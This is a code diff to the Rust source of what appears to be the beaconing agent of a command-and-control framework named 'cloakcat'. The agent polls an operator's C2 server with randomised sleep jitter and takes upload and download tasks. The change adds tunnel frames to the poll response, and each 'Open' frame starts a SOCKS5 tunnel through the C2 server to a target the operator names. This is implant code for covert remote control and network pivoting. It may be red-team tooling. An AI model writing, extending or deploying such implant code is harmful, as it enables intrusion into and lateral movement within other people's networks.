@@ -12,8 +12,8 @@ use std::time::Duration;
 
 use anyhow::Context;
 use cloakcat_protocol::{
-    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, ResultReq,
-    TaskType, UploadTask,
+    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, PollResponse,
+    ResultReq, TaskType, TunnelAction, UploadTask,
 };
 use rand::Rng;
 use tokio::time::sleep;
@@ -204,10 +204,38 @@ pub async fn run() -> anyhow::Result<()> {
             continue;
         }
 
-        let cmd: Command = match serde_json::from_str(trimmed) {
-            Ok(c) => c,
+        let resp: PollResponse = match serde_json::from_str(trimmed) {
+            Ok(r) => r,
             Err(e) => {
                 debug_log!("[agent] poll JSON parse error: {e}. raw={}", trimmed);
+                backoff_ms = None;
+                sleep(rand_between(beacon_min, beacon_max)).await;
+                continue;
+            }
+        };
+
+        // Spawn tunnel tasks for any Open frames received.
+        for frame in resp.tunnel_frames {
+            if frame.action == TunnelAction::Open {
+                debug_log!("[agent] tunnel open: id={} target={}", frame.tunnel_id, frame.data);
+                let c2 = cfg.c2_url.clone();
+                let ai = agent_id.clone();
+                let tok = auth_token.clone();
+                let tid = frame.tunnel_id;
+                let target = frame.data.clone();
+                // Build a new client for the tunnel task.
+                if let Ok(tc) = reqwest::Client::builder().build() {
+                    tokio::spawn(async move {
+                        crate::tunnel::socks5::run_tunnel(tc, c2, ai, tok, tid, target).await;
+                    });
+                }
+            }
+        }
+
+        // If no command, sleep and loop.
+        let cmd: Command = match resp.command {
+            Some(c) => c,
+            None => {
                 backoff_ms = None;
                 sleep(rand_between(beacon_min, beacon_max)).await;
                 continue;
